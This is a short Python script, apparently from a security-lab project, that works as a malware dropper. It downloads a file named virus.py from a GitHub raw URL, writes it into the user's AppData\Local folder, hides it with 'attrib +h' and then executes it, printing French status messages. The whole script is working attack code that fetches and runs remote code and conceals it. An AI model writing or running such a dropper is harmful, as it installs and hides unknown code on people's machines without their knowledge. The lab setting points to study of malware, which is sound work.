import os, requests

# os.listdir(b'C:\Users\Saluc\AppData\Local')
chemin = 'C:/Users/'+os.getcwd().split('\\')[2]+'/AppData/Local/'
url = 'https://raw.githubusercontent.com/Saluc00/Labo-Secu/master/virus.py'
req = requests.get(url).text

if not os.path.exists(chemin+'virus.py') :
       f = open(chemin+'virus.py', 'w+')
       os.system("attrib +h "+chemin+"virus.py")
       f.write(req)
       f.close()
       print('Fichier créer !')
       print(os.system(f'python ' +chemin + 'virus.py'))
else:
       print('Déja créer..')